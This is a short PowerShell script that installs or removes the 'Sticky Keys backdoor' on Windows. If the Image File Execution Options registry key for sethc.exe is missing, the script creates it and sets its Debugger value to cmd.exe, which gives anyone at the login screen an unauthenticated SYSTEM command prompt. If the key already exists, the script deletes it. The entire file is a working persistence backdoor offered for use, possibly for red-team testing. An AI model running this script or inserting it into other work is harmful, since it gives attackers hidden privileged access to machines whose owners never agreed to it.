$registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\"
$keyName = "sethc.exe" 
$stringName = "Debugger"
$binaryValue = "C:\Windows\System32\cmd.exe"

IF (Test-Path ($registryPath + $keyName))
{
    # Sticky Keys backdoor exists.
    write-host "Registry key found. Let's remove it."
    #New-Item -Path $registryPath -Name $keyName | Out-Null
    Remove-Item -Path ($registryPath + $keyName) | Out-Null
    write-host "Sticky Key backdoor has been removed."
}
ELSE {
    # Sticky Keys backdoor does not exist, let's add it.
    write-host "Registry key not found. Attempting to add Sticky Keys backdoor to registry."
    New-Item -Path $registryPath -Name $keyName | Out-Null
    New-ItemProperty -Path ($registryPath + $keyName) -Name $stringName -Value $binaryValue | Out-Null
    write-host "Sticky Keys backdoor added."
}
